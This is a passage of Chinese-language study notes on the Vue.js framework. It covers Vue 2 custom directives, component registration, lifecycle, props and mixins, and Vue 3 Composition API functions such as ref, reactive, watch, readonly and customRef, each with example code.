											el.innerHTML = binding.value.toupperCase()
										}
									}
								}

								1) 使用指令
								v-my-directive='xxx'

						二、配置对象中常用的3个回调：
									(1).bind：指令与元素成功绑定时调用。
									(2).inserted：指令所在元素被插入页面时调用。
									(3).update：指令所在模板结构被重新解析时调用。

						三、备注：
									1.指令定义时不加v-，但使用时要加v-；
									2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
									3.指令针对的是节点
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>{{name}}</h2>
			<h2>当前的n值是：<span v-text="n"></span> </h2>
			<!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
			<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>     // v-big 自定义指令
			<button @click="n++">点我n+1</button>
			<hr/>
			<input type="text" v-fbind:value="n">  // v-fbind 自定义指令
		</div>
	</body>
	
	<script type="text/javascript">
		Vue.config.productionTip = false

		//定义全局指令
		/* Vue.directive('fbind',{
			//指令与元素成功绑定时（一上来）
			bind(element,binding){
				element.value = binding.value
			},
			//指令所在元素被插入页面时
			inserted(element,binding){
				element.focus()
			},
			//指令所在的模板被重新解析时
			update(element,binding){
				element.value = binding.value
			}
		}) */

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:1
			},
			//指令
			directives:{
				//big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
				/* 'big-number'(element,binding){
					// console.log('big')
					element.innerText = binding.value * 10
				}, */
				// 方法1
				big(el,binding){
					console.log('big',this)      //注意此处的this是window       ------------
					// console.log('big')
					el.innerText = binding.value * 10  //el.innerText = 修改内容   //binding表示自定义指令=的东西
				},
				// 方法2
				fbind:{
					//指令与元素成功绑定时（一上来）
					bind(el,binding){
						el.value = binding.value
					},
					//指令所在元素被插入页面时
					inserted(element,binding){
						element.focus()
					},
					//指令所在的模板被重新解析时
					update(element,binding){
						element.value = binding.value
					}
				}
			}
		})
		
	</script>
</html>
```

## ——————

## 组件:crossed_swords:

> 使用组件, 一般会使用vue-cli脚手架

Vue的组件化设计思想借鉴了Java的面向对象思想。Java认为万物皆对象，**在Vue中，万物皆组件**。

 也就是说，在实际的vue项目中，以及使用了Vue框架的项目中，Vue的对象都会以组件的形式出现，能被反复使用。

要想实现组件化，需要在页面中注册组件：

+ 全局注册
+ 本地注册

###  组件的全局注册

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>vue组件的全局注册</title>
</head>
<body>

    <div id="app">

        <model1></model1>
        <model1></model1>
        <model1></model1>

    </div>
        <hr/>
    <div id="app1">

        <model1></model1>
        <model1></model1>
        <model1></model1>

    </div>


</body>

<script src="https://cdn.bootcss.com/vue/2.6.10/vue.js"></script>
<script>
	//通过Vue.component实现组件的全局注册，全局注册后的组件可以被重复使用。
    Vue.component("model1",{

        template:"<div><h1>{{title}}</h1><button type='button' @click='btnfn'>点我</button></div>",
        data:function(){
            return {
                title:"hello vue"
            }
        },
        methods:{
            btnfn:function(){
                alert("hello !!!");
            }
        }
    });

    new Vue({
        el:'#app'
    })
    new Vue({
        el:'#app1'
    })


</script>

</html>
```



###  组件的本地注册



vue的全局注册，也就意味着在页面的任意一个被vue绑定过的div中，都可以使用全局注册了的vue组件。

 

但是，如果是对vue组件进行本地注册，那么在其他被vue绑定的div中，不能使用该组件。



```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>vue组件的本地(局部)注册</title>
</head>
<body>

    <div id="app">

        <model11></model11>
    </div>
	<hr/>
    <!--在这里使用组件model11会报错-->
    <div id="app1">
        <model11></model11>
    </div>


</body>

<script src="https://cdn.bootcss.com/vue/2.6.10/vue.js"></script>
<script>

    new Vue({
        el:'#app',
        components:{
            "model11":{

                template:"<div><h1>{{title}}</h1><button type='button' @click='btnfn'>点我</button></div>",
                data:function(){
                    return {
                        title:"hello vue"
                    }
                },
                methods:{
                    btnfn:function(){
                        alert("hello !!!");
                    }
                }
            }
        }
    })
    new Vue({
        el:'#app1'
    })

</script>
```

这是一个完整的Vue组件。该组件包含了三个部分：template（html视图层内容）、script（Model层）、style（CSS样式）。这样封装好的组件可以被复用，也可以作为其他组件的组成部分而被封装——Java的面向对象再次体现。

 

-  **特点1： template标签内，必须有且只能有一个根标签。** 
-  **特点2： componet中注册的组件中的data，必须是函数的形式。**
   如下： 

 



```html
data:function(){
return {
title:"hello vue"     
} 
}
```



###  组件的生命周期

Vue中的组件也是有生命周期的。一个Vue组件会经历：初始化、创建、绑定、更新、销毁等阶段，不同的阶段，都会有相应的生命周期钩子函数被调用。

```html
<!-- 
vm的一生(vm的生命周期)：
将要创建   调用beforeCreate函数。
创建完毕  ===> 调用created函数。
将要挂载  ===> 调用beforeMount函数。 (重要)
挂载完毕  ===> 调用mounted函数。=============>【重要的钩子】
将要更新  ===> 调用beforeUpdate函数。
更新完毕   ===> 调用updatedi函数。
(重要)将要销毁 ===> 调用beforeDestroyi函数。====>【重要的钩子】
销毁完毕==>   调用destroyed函数。


//       -----------------

常用的生命周期钩子：
1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。     
2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。


关于销毁Vue实例
1.销毁后借助Vue开发者工具看不到任何信息。
2.销毁后自定义事件会失效，但原生DOM事件依然有效。
3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。
-->
<!-- 准备好一个容器-->
```



```html
<html>
	<head>
		<meta charset="UTF-8">
		<title>生命周期</title>
	</head>
	<body>
		<div id="app1">
			{{title}}
			<button type="button" @click="changeTitle">change title</button>
			<button type="button" @click="destroy">destroy</button>
		</div>
	</body>
	<script src="https://cdn.bootcss.com/vue/2.5.17-beta.0/vue.min.js"></script>
	<script>
		new Vue({
			el:"#app1",
			data:{
				title:"this is title"
			},
			methods:{
				changeTitle:function(){
					this.title= "new title";
				},
				destroy:function(){
					this.$destroy();
				}
			},
			beforeCreate(){
				console.log("beforeCreate")
			},
			created(){
				console.log("created")
			},
			beforeMount(){
				console.log("beforeMount")
			},
			mounted(){                                  // 初始化
				console.log("mounted")
			},
			beforeUpdate(){
				console.log("beforeUpdate")
			},
			updated(){
				console.log("updated")
			},
			beforeDestroy(){                            // 销毁
				console.log("beforeDestory")
			},
			destroyed(){
				console.log("destory")
			}
		})
	</script>
</html>
```

| 组件的生命周期钩子                                           |
| ------------------------------------------------------------ |
| ![img](vue%E7%AC%94%E8%AE%B0.assets/1646013757802-713c7e4d-740d-440d-a470-4630bd03666b.png) |

## Vue组件间的参数传递

------

#### 11.1 idea中安装Vue插件

在idea中下载vue插件



![img](vue%E7%AC%94%E8%AE%B0.assets/1646014031373-51ea51b2-4e36-4171-884b-28d88c39db05.png)



在idea中配置，让idea能够操作.vue文件



​	![img](vue%E7%AC%94%E8%AE%B0.assets/1646014047515-c6e14a10-eb82-47cb-889f-d61fd1fe52af.png)



#### 11.2 在项目中创建子组件



创建子组件Content组件



```html
<template>
    <div>
      商品列表...
      {{MyTitle}}
      <button type="button" @click="btnfn('hello java')">点我</button>
    </div>
</template>

<script>
    export default {
        name: "Content.vue",
        props:{
          'MyTitle':{
            type:String,
            required:true,
            default:'XX'
          },
          'btnfn':{
            type:Function
          }
        }
    }
</script>

<style scoped>

</style>
```



#### 11.3 注册子组件



在main.js中注册子组件



```javascript
import Vue from 'vue'
import App from './App.vue'
//引入Content
import Content from './components/Content'


//全局注册组件
Vue.component('MyContent',Content);

new Vue({
  el: '#app',
  render: h => h(App)
})
```



#### 11.4 在App.vue中使用组件并传递参数



```html
<template>
  <div id="app">
		<MyContent :MyTitle="msg"  :btnfn="FCfn" ></MyContent>
  </div>
</template>

<script>
  import MHeader from './components/Header'
export default {
  name: 'app',
  data(){
    return {
      msg:'hello vue!!'
    }
  },
  components:{
    "MHeader":MHeader
  },
  methods:{
    FCfn:function(m){//hello java
      this.msg = m;
    }
  }

}
</script>
<style>

</style>
```



#### 11.5 父传子



通过子组件的props部分，来指明明接收的参数，父组件通过在标签中写明参数的键值对来传递参数。

 

​	props是表示一个组件的参数部分，那么props的写法有两种：

 

​		1）props:[参数列表]

 

​		比如： props:['MyProp1','MyProp2',...]

 

​		2）props:{参数名1:{type:String,required:true,default:'XX'},参数名2:{...}}



![img](vue%E7%AC%94%E8%AE%B0.assets/1646014085293-42216296-d847-4d34-b634-cfe5bdcc2c27.png)

![img](vue%E7%AC%94%E8%AE%B0.assets/1646014101808-4645cc39-799e-4e20-aba4-c52635cf878a.png)





#### 11.6 子传父



子传父的过程十分复杂，下列图解中已经配上了详细的步骤。



![img](vue%E7%AC%94%E8%AE%B0.assets/1646014114070-217acd4b-3f7d-4373-9b70-0c46d929422a.png)



![img](vue%E7%AC%94%E8%AE%B0.assets/1646014123006-822f11ee-c90b-454d-bff5-92bfbc8f82b8.png)

## ref 属性

1. 被用来给元素或子组件注册引用信息（id的替代者）
2. 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）
3. 使用方式：
   1. 打标识：```<h1 ref="xxx">.....</h1>``` 或 ```<School ref="xxx"></School>```
   2. 获取：```this.$refs.xxx```

## props 配置[组件传参]

1. 功能：让组件接收外部传过来的数据

2. 传递数据：```<Demo name="xxx"/>```

3. 接收数据：

   1. 第一种方式（只接收）：```props:['name'] ```

   2. 第二种方式（限制类型）：```props:{name:String}```

   3. 第三种方式（限制类型、限制必要性、指定默认值）：

      ```js
      props:{
      	name:{
      	type:String, //类型
      	required:true, //必要性
      	default:'老王' //默认值
      	}
      }
      ```

   > 备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。





## mixin 混入[公共部分]

1. 功能：可以把多个组件共用的配置提取成一个混入对象

2. 使用方式：

   第一步定义混合：

   ```
   {
       data(){....},
       methods:{....}
       ....
   }
   ```

   第二步使用混入：

   ​	全局混入：```Vue.mixin(xxx)```
   ​	局部混入：```mixins:['xxx']	```

## 插件

1. 功能：用于增强Vue

2. 本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。

3. 定义插件：

   ```js
   对象.install = function (Vue, options) {
       // 1. 添加全局过滤器
       Vue.filter(....)
   
       // 2. 添加全局指令
       Vue.directive(....)
   
       // 3. 配置全局混入(合)
       Vue.mixin(....)
   
       // 4. 添加实例方法
       Vue.prototype.$myMethod = function () {...}
       Vue.prototype.$myProperty = xxxx
   }
   ```

4. 使用插件：```Vue.use()```

## scoped样式

1. 作用：让样式在局部生效，防止冲突。
2. 写法：```<style scoped>```







## 组件间通信

### 方式1: 组件的自定义事件[类似信号]

1. 一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件(<span style="color:red">事件的回调在A中</span>）

### 方式2: 全局事件总线

1. 一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2. 安装全局事件总线：

### 方式3: 消息订阅与发布

1.   一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2.   使用步骤：

     1. 安装pubsub：```npm i pubsub-js```

     2. 引入: ```import pubsub from 'pubsub-js'```

     3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red">回调留在A组件自身</span>

### 方式4: 插槽

1. 作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===> 子组件</strong> 
2. 分类：默认插槽、具名插槽、作用域插槽











## 过度与动画



## Vue-router 路由







## 使用Axios发送请求



# Vuex







# vue3

### 常用 Composition API

官方文档: https://v3.cn.vuejs.org/guide/composition-api-introduction.html

## 1.setup函数

1. 理解：Vue3.0中一个新的配置项，值为一个函数。
2. setup是所有<strong style="color:#DD5145">Composition API（组合API）</strong><i style="color:gray;font-weight:bold">“ 表演的舞台 ”</i>。
3. 组件中所用到的：数据、方法等等，均要配置在setup中。
4. setup函数的两种返回值：
   1. 若返回一个对象，则对象中的属性、方法, 在模板中均可以直接使用。（重点关注！）
   2. <span style="color:#aad">若返回一个渲染函数：则可以自定义渲染内容。（了解）</span>
5. 注意点：
   1. **不要与Vue2.x语法混用**
      - Vue2.x配置（data、methos、computed...）中<strong style="color:#DD5145">可以访问到</strong>setup中的属性、方法。
      - 但在setup中<strong style="color:#DD5145">不能访问到</strong>Vue2.x配置（data、methos、computed...）。
      - 如果有重名, setup优先。
   2. **setup不能是一个async函数**，因为返回值不再是return的对象, 而是promise, 模板看不到return对象中的属性。（后期也可以返回一个Promise实例，但需要Suspense和异步组件的配合）

##  2.ref函数

- 作用: 定义一个响应式的数据
- 语法: ```const xxx = ref(initValue)``` 
  - 创建一个包含响应式数据的<strong style="color:#DD5145">引用对象（reference对象，简称ref对象）</strong>。
  - JS中操作数据： ```xxx.value```
  - 模板中读取数据: 不需要.value，直接：```<div>{{xxx}}</div>```
- 备注：
  - 接收的数据可以是：基本类型、也可以是对象类型。
  - 基本类型的数据：响应式依然是靠``Object.defineProperty()``的```get```与```set```完成的。
  - 对象类型的数据：内部 <i style="color:gray;font-weight:bold">“ 求助 ”</i> 了Vue3.0中的一个新函数—— ```reactive```函数。

```vue
<template>
	<h1>一个人的信息</h1>
	<h2>姓名：{{name}}</h2>
	<h2>年龄：{{age}}</h2>
	<h3>工作种类：{{job.type}}</h3>
	<h3>工作薪水：{{job.salary}}</h3>
	<button @click="changeInfo">修改人的信息</button>
</template>

/*
- 作用: 定义一个基本类型的响应式的数据
- 创建一个包含响应式数据的<strong style="color:#DD5145">引用对象(reference对象, 简称ref对象)</strong>。
- JS中操作数据: xxx.value
- 模板中读取数据: 不需要.value, 直接: <div>{{xxx}}</div>
 */
<script>
	import {ref} from 'vue'        // 引入
	export default {
		name: 'App',
		setup(){
			//数据
			let name = ref('张三')   //ref定义一个响应式的数据(动态)
			let age = ref(18)
			// 对象最好是使用reactive函数
			let job = ref({
				type:'前端工程师',
				salary:'30K'
			})

			//方法
			function changeInfo(){
				// name.value = '李四'
				// age.value = 48
				console.log(job.value)
				// job.value.type = 'UI设计师'  //不能写成job.type.value
				// job.value.salary = '60K'
				// console.log(name,age)
			}

			//返回一个对象（常用）
			return {
				name,
				age,
				job,
				changeInfo
			}
		}
	}
</script>
```



## 3.reactive函数

- 作用: 定义一个<strong style="color:#DD5145">对象类型</strong>的响应式数据（基本类型不要用它，要用```ref```函数）
- 语法：```const 代理对象= reactive(源对象)```接收一个对象（或数组），返回一个<strong style="color:#DD5145">代理对象（Proxy的实例对象，简称proxy对象）</strong>
- reactive定义的响应式数据是“深层次的”。
- 内部基于 ES6 的 Proxy 实现，通过代理对象操作源对象内部数据进行操作。

```vue
<template>
	<h1>一个人的信息</h1>
	<h2>姓名：{{person.name}}</h2>
	<h2>年龄：{{person.age}}</h2>
	<h3>工作种类：{{person.job.type}}</h3>
	<h3>工作薪水：{{person.job.salary}}</h3>
	<h3>爱好：{{person.hobby}}</h3>
	<h3>测试的数据c：{{person.job.a.b.c}}</h3>
	<button @click="changeInfo">修改人的信息</button>
</template>

/*
- 作用: 定义一个对象类型的响应式数据（基本类型不要用它，要用ref函数）
- 语法：```const 代理对象= reactive(源对象)接收一个对象（或数组），返回一个代理对象（Proxy的实例对象，简称proxy对象）</strong>
- reactive定义的响应式数据是“深层次的”。
- 内部基于 ES6 的 Proxy 实现，通过代理对象操作源对象内部数据进行操作。
 */
<script>
	import {reactive} from 'vue'
	export default {
		name: 'App',
		setup(){
			//数据
			let person = reactive({
				name:'张三',
				age:18,
				job:{
					type:'前端工程师',
					salary:'30K',
					a:{
						b:{
							c:666
						}
					}
				},
				hobby:['抽烟','喝酒','烫头']
			})

			//方法
			function changeInfo(){
				person.name = '李四'
				person.age = 48
				person.job.type = 'UI设计师'
				person.job.salary = '60K'
				person.job.a.b.c = 999
				person.hobby[0] = '学习'
			}

			//返回一个对象（常用）
			return {
				person,
				changeInfo
			}
		}
	}
</script>
```

## 5.reactive对比ref

-  从定义数据角度对比：
   -  ref用来定义：<strong style="color:#DD5145">基本类型数据</strong>。
   -  reactive用来定义：<strong style="color:#DD5145">对象（或数组）类型数据</strong>。
   -  备注：ref也可以用来定义<strong style="color:#DD5145">对象（或数组）类型数据</strong>, 它内部会自动通过```reactive```转为<strong style="color:#DD5145">代理对象</strong>。
-  从原理角度对比：
   -  ref通过``Object.defineProperty()``的```get```与```set```来实现响应式（数据劫持）。
   -  reactive通过使用<strong style="color:#DD5145">Proxy</strong>来实现响应式（数据劫持）, 并通过<strong style="color:#DD5145">Reflect</strong>操作<strong style="color:orange">源对象</strong>内部的数据。
-  从使用角度对比：
   -  ref定义的数据：操作数据<strong style="color:#DD5145">需要</strong>```.value```，读取数据时模板中直接读取<strong style="color:#DD5145">不需要</strong>```.value```。
   -  reactive定义的数据：操作数据与读取数据：<strong style="color:#DD5145">均不需要</strong>```.value```。

## 4.Vue3.0中的更删改查操作

### vue2.x的响应式

- 实现原理：

  - 对象类型：通过```Object.defineProperty()```对属性的读取、修改进行拦截（数据劫持）。

  - 数组类型：通过重写更新数组的一系列方法来实现拦截。（对数组的变更方法进行了包裹）。

    ```js
    Object.defineProperty(data, 'count', {
        get () {}, 
        set () {}
    })
    ```

- 存在问题：

  - 新增属性、删除属性, 界面不会更新。
  - 直接通过下标修改数组, 界面不会自动更新。

### Vue3.0的响应式

+ 解决:
  - 新增属性、删除属性, 界面不会更新。
  - 直接通过下标修改数组, 界面不会自动更新。

- 实现原理: 

  - 通过Proxy（代理）:  拦截对象中任意属性的变化, 包括：属性值的读写、属性的添加、属性的删除等。

  - 通过Reflect（反射）:  对源对象的属性进行操作。

  - MDN文档中描述的Proxy与Reflect：

    - Proxy：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy

    - Reflect：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect

      ```js
      new Proxy(data, {
      	// 拦截读取属性值
          get (target, prop) {
          	return Reflect.get(target, prop)
          },
          // 拦截设置属性值或添加新属性
          set (target, prop, value) {
          	return Reflect.set(target, prop, value)
          },
          // 拦截删除属性
          deleteProperty (target, prop) {
          	return Reflect.deleteProperty(target, prop)
          }
      })
      
      proxy.name = 'tom'   
      ```

## 6.setup的两个注意点

- setup执行的时机
  - 在beforeCreate之前执行一次，this是undefined。

- setup的参数
  - props：值为对象，包含：组件外部传递过来，且组件内部声明接收了的属性。
  - context：上下文对象
    - attrs: 值为对象，包含：组件外部传递过来，但没有在props配置中声明的属性, 相当于 ```this.$attrs```。
    - slots: 收到的插槽内容, 相当于 ```this.$slots```。
    - emit: 分发自定义事件的函数, 相当于 ```this.$emit```。

## 7.计算属性与监视

### 1.computed函数

- 与Vue2.x中computed配置功能一致

- 写法

  ```js
  import {computed} from 'vue'
  
  setup(){
      ...
  	//计算属性——简写
      let fullName = computed(()=>{
          return person.firstName + '-' + person.lastName
      })
      //计算属性——完整
      let fullName = computed({
          get(){
              return person.firstName + '-' + person.lastName
          },
          set(value){
              const nameArr = value.split('-')
              person.firstName = nameArr[0]
              person.lastName = nameArr[1]
          }
      })
  }
  ```

### 2.watch函数

- 与Vue2.x中watch配置功能一致

- 两个小“坑”：

  - 监视reactive定义的响应式数据时：oldValue无法正确获取、强制开启了深度监视（deep配置失效）。
  - 监视reactive定义的响应式数据中某个属性时：deep配置有效。

  ```js
  //情况一：监视ref定义的响应式数据
  watch(sum,(newValue,oldValue)=>{
  	console.log('sum变化了',newValue,oldValue)
  },{immediate:true})
  
  //情况二：监视多个ref定义的响应式数据
  watch([sum,msg],(newValue,oldValue)=>{
  	console.log('sum或msg变化了',newValue,oldValue)
  }) 
  
  /* 情况三：监视reactive定义的响应式数据
  			若watch监视的是reactive定义的响应式数据，则无法正确获得oldValue！！
  			若watch监视的是reactive定义的响应式数据，则强制开启了深度监视 
  */
  watch(person,(newValue,oldValue)=>{
  	console.log('person变化了',newValue,oldValue)
  },{immediate:true,deep:false}) //此处的deep配置不再奏效
  
  //情况四：监视reactive定义的响应式数据中的某个属性
  watch(()=>person.job,(newValue,oldValue)=>{
  	console.log('person的job变化了',newValue,oldValue)
  },{immediate:true,deep:true}) 
  
  //情况五：监视reactive定义的响应式数据中的某些属性
  watch([()=>person.job,()=>person.name],(newValue,oldValue)=>{
  	console.log('person的job变化了',newValue,oldValue)
  },{immediate:true,deep:true})
  
  //特殊情况
  watch(()=>person.job,(newValue,oldValue)=>{
      console.log('person的job变化了',newValue,oldValue)
  },{deep:true}) //此处由于监视的是reactive素定义的对象中的某个属性，所以deep配置有效
  ```

### 3.watchEffect函数

- watch的套路是：**既要指明监视的属性，也要指明监视的回调。**

- watchEffect的套路是：不用指明监视哪个属性，监视的回调中用到哪个属性，那就监视哪个属性。

- watchEffect有点像computed：

  - 但computed注重的计算出来的值（回调函数的返回值），所以必须要写返回值。
  - 而watchEffect更注重的是过程（回调函数的函数体），所以不用写返回值。

  ```js
  //watchEffect所指定的回调中用到的数据只要发生变化，则直接重新执行回调。
  watchEffect(()=>{
      const x1 = sum.value
      const x2 = person.age
      console.log('watchEffect配置的回调执行了')
  })
  ```

## 8.生命周期

- Vue3.0中可以继续使用Vue2.x中的生命周期钩子，但有有两个被更名：
  - ```beforeDestroy```改名为 ```beforeUnmount```
  - ```destroyed```改名为 ```unmounted```
- Vue3.0也提供了 Composition API 形式的生命周期钩子，与Vue2.x中钩子对应关系如下：
  - `beforeCreate`===>`setup()`
  - `created`=======>`setup()`
  - `beforeMount` ===>`onBeforeMount`
  - `mounted`=======>`onMounted`
  - `beforeUpdate`===>`onBeforeUpdate`
  - `updated` =======>`onUpdated`
  - `beforeUnmount` ==>`onBeforeUnmount`
  - `unmounted` =====>`onUnmounted`

## 9.自定义hook函数

- 什么是hook？—— 本质是一个函数，把setup函数中使用的Composition API进行了封装。

- 类似于vue2.x中的mixin。(把公有部分单独写)

- 自定义hook的优势: 复用代码, 让setup中的逻辑更清楚易懂。

```js
import {reactive,onMounted,onBeforeUnmount} from 'vue'  // 引入
export default function (){
	//实现鼠标“打点”相关的数据
	let point = reactive({
		x:0,
		y:0
	})

	//实现鼠标“打点”相关的方法
	function savePoint(event){
		point.x = event.pageX
		point.y = event.pageY
		console.log(event.pageX,event.pageY)
	}

	//实现鼠标“打点”相关的生命周期钩子
	onMounted(()=>{
		window.addEventListener('click',savePoint)   //增加事件,调用函数savePoint
	})

	onBeforeUnmount(()=>{
		window.removeEventListener('click',savePoint) //移除事件
	})

	return point
}
```



## 10.toRef

- 作用：创建一个 ref 对象，其value值指向另一个对象中的某个属性。(**相当于引用**)
- 语法：```const name = toRef(person,'name')```
- 应用:   要将响应式对象中的某个属性单独提供给外部使用时。


- 扩展：```toRefs``` 与```toRef```功能一致，但可以批量创建多个 ref 对象，语法：```toRefs(person)```

```vue
// 报错
 const name1 = person.name
 name1 = "jj"
 console.log('%%%',name1)

// ok
 const name2 = toRef(person,'name')
 name2 = "jj"
 console.log('####',name2)
//-----------------------------------------

// 配合return使用
//返回一个对象（常用）
return {
person,
name:toRef(person,'name'),
age:toRef(person,'age'),
salary:toRef(person.job.j1,'salary'),

//返回对象引用, 也可以直接person
...toRefs(person)
}
```




# 三、其它 Composition API

## 1.shallowReactive 与 shallowRef

- shallowReactive：只处理对象最外层属性的响应式（浅响应式）。只考虑第一层数据的响应式
- shallowRef：只处理基本数据类型的响应式, 不进行对象的响应式处理。
- 什么时候使用?
  -  如果有一个对象数据，结构比较深, 但变化时只是外层属性变化 ===> shallowReactive。
  -  如果有一个对象数据，后续功能不会修改该对象中的属性，而是生新的对象来替换 ===> shallowRef。

## 2.readonly 与 shallowReadonly

- readonly: 让一个响应式数据变为只读的（深只读）。(相当于const)
- shallowReadonly：让一个响应式数据变为只读的（浅只读）。
- 应用场景: 不希望数据被修改时。

```vue
<template>
	<h4>当前求和为：{{sum}}</h4>
	<button @click="sum++">点我++</button>
	<hr>
	<h2>姓名：{{name}}</h2>
	<h2>年龄：{{age}}</h2>
	<h2>薪资：{{job.j1.salary}}K</h2>
	<button @click="name+='~'">修改姓名</button>
	<button @click="age++">增长年龄</button>
	<button @click="job.j1.salary++">涨薪</button>
</template>
/*
- readonly: 让一个响应式数据变为只读的（深只读）。
- shallowReadonly：让一个响应式数据变为只读的（浅只读）。
- 应用场景: 不希望数据被修改时。
*/ 
<script>
	import {ref,reactive,toRefs,readonly,shallowReadonly} from 'vue'
	export default {
		name: 'Demo',
		setup(){
			//数据
			let sum = ref(0)
			let person = reactive({
				name:'张三',
				age:18,
				job:{
					j1:{
						salary:20
					}
				}
			})

			//让一个响应式数据变为只读的（深只读）
			person = readonly(person)
			// person = shallowReadonly(person)
			// sum = readonly(sum)
			// sum = shallowReadonly(sum)

			//返回一个对象（常用）
			return {
				sum,
				...toRefs(person)
			}
		}
	}
</script>


```

## 3.toRaw 与 markRaw

**响应式对象转为普通对象**

- toRaw：
  - 作用：将一个由```reactive```生成的<strong style="color:orange">响应式对象</strong>转为<strong style="color:orange">普通对象</strong>。
  - 使用场景：用于读取响应式对象对应的普通对象，对这个普通对象的所有操作，不会引起页面更新。
- markRaw：
  - 作用：标记一个对象，使其永远不会再成为响应式对象。
  - 应用场景:
    1. 有些值不应被设置为响应式的，例如复杂的第三方类库等。
    2. 当渲染具有不可变数据源的大列表时，跳过响应式转换可以提高性能。

```vue
<template>
	<h4>当前求和为：{{sum}}</h4>
	<button @click="sum++">点我++</button>
	<hr>
	<h2>姓名：{{name}}</h2>
	<h2>年龄：{{age}}</h2>
	<h2>薪资：{{job.j1.salary}}K</h2>
	<h3 v-show="person.car">座驾信息：{{person.car}}</h3>
	<button @click="name+='~'">修改姓名</button>
	<button @click="age++">增长年龄</button>
	<button @click="job.j1.salary++">涨薪</button>
	<button @click="showRawPerson">输出最原始的person</button>
	<button @click="addCar">给人添加一台车</button>
	<button @click="person.car.name+='!'">换车名</button>
	<button @click="changePrice">换价格</button>
</template>
/*
响应式对象转为普通对象
- toRaw：
  - 作用：将一个由```reactive```生成的<strong style="color:orange">响应式对象</strong>转为<strong style="color:orange">普通对象</strong>。
  - 使用场景：用于读取响应式对象对应的普通对象，对这个普通对象的所有操作，不会引起页面更新。
- markRaw：
  - 作用：标记一个对象，使其永远不会再成为响应式对象。
  - 应用场景:
    1. 有些值不应被设置为响应式的，例如复杂的第三方类库等。
    2. 当渲染具有不可变数据源的大列表时，跳过响应式转换可以提高性能。
*/
<script>
	import {ref,reactive,toRefs,toRaw,markRaw} from 'vue'
	export default {
		name: 'Demo',
		setup(){
			//数据
			let sum = ref(0)
			let person = reactive({
				name:'张三',
				age:18,
				job:{
					j1:{
						salary:20
					}
				}
			})

			function showRawPerson(){
				// 效果person.age不会变化
				const p = toRaw(person)
				p.age++
				console.log(p)
			}

			function addCar(){
				let car = {name:'奔驰',price:40}
				// person.car = xxx 添加一个car属性
				person.car = markRaw(car)  //标记一个对象，使其永远不会再成为响应式对象。
			}

			function changePrice(){
				person.car.price++
				console.log(person.car.price)
			}

			//返回一个对象（常用）
			return {
				sum,
				person,             // 
				...toRefs(person),  // 调用的时候person没有car属性,可以在前面再写个person也可以直接先去定义一个空属性
				showRawPerson,
				addCar,
				changePrice
			}
		}
	}
</script>


```



## 4.customRef

- 作用：创建一个自定义的 ref，并对其依赖项跟踪和更新触发进行显式控制。

- 实现防抖效果：

  ```vue
  <template>
  	<input type="text" v-model="keyword">
  	<h3>{{keyword}}</h3>
  </template>
  
  <script>
  	import {ref,customRef} from 'vue'
  	export default {
  		name:'Demo',
  		setup(){
  			// let keyword = ref('hello') //使用Vue准备好的内置ref
  			//自定义一个myRef
  			function myRef(value,delay){
  				let timer
  				//通过customRef去实现自定义
  				return customRef((track,trigger)=>{
  					return{
  						get(){
  							track() //告诉Vue这个value值是需要被“追踪”的
  							return value
  						},
  						set(newValue){
  							clearTimeout(timer)
  							timer = setTimeout(()=>{
  								value = newValue
  								trigger() //告诉Vue去更新界面
  							},delay)
  						}
  					}
  				})
  			}
  			let keyword = myRef('hello',500) //使用程序员自定义的ref
  			return {
  				keyword
  			}
  		}
  	}
  </script>
  ```

  

## 5.provide 与 inject

<img src="vue%E7%AC%94%E8%AE%B02.0.assets/components_provide.png" style="width:300px" />

- 作用：实现<strong style="color:#DD5145">祖与后代组件间</strong>通信

- 套路：父组件有一个 `provide` 选项来提供数据，后代组件有一个 `inject` 选项来开始使用这些数据

- 具体写法：

  1. 祖组件中：

     ```js
     setup(){
     	......
         //父组件有一个 `provide` 选项来提供数据
         let car = reactive({name:'奔驰',price:'40万'})
         provide('car',car)
         ......
     }
     ```

  2. 后代组件中：

     ```js
     setup(props,context){
     	......
         //后代组件有一个 `inject` 选项来开始使用这些数据
         const car = inject('car')
         return {car}
     	......
     }
     ```

## 6.判断是否是响应式数据api

- isRef: 检查一个值是否为一个 ref 对象
- isReactive: 检查一个对象是否是由 `reactive` 创建的响应式代理
- isReadonly: 检查一个对象是否是由 `readonly` 创建的只读代理
- isProxy: 检查一个对象是否是由 `reactive` 或者 `readonly` 方法创建的代理

```vue
<template>
	<h3>我是App组件</h3>
</template>

<script>
	import {ref, reactive,toRefs,readonly,isRef,isReactive,isReadonly,isProxy } from 'vue'
	export default {
		name:'App',
		setup(){
			let car = reactive({name:'奔驰',price:'40W'})
			let sum = ref(0)
			let car2 = readonly(car)

			console.log(isRef(sum))
			console.log(isReactive(car))
			console.log(isReadonly(car2))
			console.log(isProxy(car))
			console.log(isProxy(sum))

			
